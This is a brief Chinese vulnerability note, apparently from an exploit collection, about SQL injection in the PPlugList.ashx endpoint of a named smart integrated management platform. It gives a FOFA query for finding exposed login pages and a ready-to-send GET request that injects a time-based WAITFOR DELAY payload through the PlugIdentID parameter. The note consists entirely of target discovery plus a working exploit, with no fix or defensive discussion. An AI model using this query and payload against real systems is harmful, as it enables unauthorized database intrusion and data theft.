# 银达汇智智慧综合管理平台PPlugList接口存在SQL注入

# fofa
```
title="智慧综合管理平台登入"
```

# poc
```javascrip
GET /Module/CJGL/Controller/PPlugList.ashx?action=find&PlugIdentID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
```
